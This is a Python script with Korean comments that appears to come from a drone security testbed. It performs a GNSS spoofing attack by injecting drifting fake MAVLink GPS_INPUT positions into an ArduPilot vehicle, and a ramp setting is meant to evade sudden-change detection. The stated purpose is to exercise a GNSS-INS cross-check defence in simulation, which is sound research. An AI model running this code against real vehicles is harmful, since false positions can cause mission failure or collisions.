"""
공격 #2 — GNSS 스푸핑 (GNSS-INS 불일치 유발)

위협모델: STRIDE-Spoofing, TARA(경로 왜곡→임무 실패/충돌), STPA-Sec(불안전 제어행동)

원리
----
실제 GPS 스푸핑은 위성 신호보다 강한 위조 RF를 방사해 수신기가 가짜 위치를 산출하게
만든다. 본 시뮬레이션에서는 이를 프로토콜 수준(MAVLink GPS_INPUT 외부 GPS 주입)으로
정직하게 모델링한다. 공격자가 점진적으로 이동하는 위조 좌표를 주입하면:

  - GPS_RAW_INT (원시 GPS)      → 위조 좌표로 끌려감
  - GLOBAL_POSITION_INT (EKF/INS) → 관성항법이 잠시 참 경로를 유지

두 값의 divergence 가 커지는 것이 스푸핑의 관측 가능한 서명이며, 방어의
'다중 항법 교차검증(GNSS-INS)'이 이를 임계값 초과로 탐지한다.

* SITL에서는 이 스크립트 대신 `param set SIM_GPS_GLITCH_X/Y` 또는 SIM_GPS 파라미터로
  동일한 효과를 재현할 수 있다.

사용:
    python -m attacks.gnss_spoof --target udpout:127.0.0.1:14555 --drift-m 150 --rate 5
"""
from __future__ import annotations

import argparse
import math
import time

from pymavlink import mavutil
from pymavlink.dialects.v20 import common as mav

HOME_LAT = 37.5000
HOME_LON = 127.0000
EARTH_R = 6378137.0


def meters_to_latlon(dnorth_m, deast_m, lat0):
    dlat = dnorth_m / EARTH_R * (180.0 / math.pi)
    dlon = deast_m / (EARTH_R * math.cos(math.radians(lat0))) * (180.0 / math.pi)
    return dlat, dlon


def send_gps_input(m, lat_deg, lon_deg, alt_m=100.0):
    # GPS_INPUT: 외부 GPS 주입 메시지 (ArduPilot 지원)
    m.mav.gps_input_send(
        int(time.time() * 1e6) % (2**32),  # time_usec
        0,                                  # gps_id
        (mav.GPS_INPUT_IGNORE_FLAG_VEL_HORIZ |
         mav.GPS_INPUT_IGNORE_FLAG_VEL_VERT),
        0, 0,                               # time_week_ms, time_week
        3,                                  # fix_type = 3D
        int(lat_deg * 1e7), int(lon_deg * 1e7), alt_m,
        1.0, 1.0,                           # hdop, vdop
        0, 0, 0,                            # vn, ve, vd
        0.5, 0.5, 0.5,                      # speed/horiz/vert accuracy
        14)                                 # satellites_visible


def main():
    ap = argparse.ArgumentParser(description="GNSS 스푸핑 공격")
    ap.add_argument("--target", default="udpout:127.0.0.1:14555")
    ap.add_argument("--drift-m", type=float, default=150.0,
                    help="최종적으로 밀어낼 위치 오차(m)")
    ap.add_argument("--ramp-s", type=float, default=8.0,
                    help="오차를 서서히 키우는 시간(s) — 급변 탐지 회피 시도")
    ap.add_argument("--rate", type=float, default=5.0, help="주입 주파수(Hz)")
    ap.add_argument("--bearing-deg", type=float, default=90.0,
                    help="위치를 밀어낼 방향(0=북,90=동)")
    ap.add_argument("--hold-s", type=float, default=6.0,
                    help="최대 오차 유지 시간(s)")
    args = ap.parse_args()

    m = mavutil.mavlink_connection(args.target, source_system=200)
    print(f"[gnss_spoof] target={args.target} drift={args.drift_m}m "
          f"bearing={args.bearing_deg}° ramp={args.ramp_s}s")

    dt = 1.0 / args.rate
    t0 = time.time()
    total = args.ramp_s + args.hold_s
    while True:
        t = time.time() - t0
        if t > total:
            break
        frac = min(1.0, t / args.ramp_s)
        off = args.drift_m * frac
        dn = off * math.cos(math.radians(args.bearing_deg))
        de = off * math.sin(math.radians(args.bearing_deg))
        dlat, dlon = meters_to_latlon(dn, de, HOME_LAT)
        send_gps_input(m, HOME_LAT + dlat, HOME_LON + dlon)
        if int(t * args.rate) % int(args.rate) == 0:
            print(f"  t={t:4.1f}s  주입오차≈{off:5.0f}m")
        time.sleep(dt)
    print("[gnss_spoof] 완료")


if __name__ == "__main__":
    main()
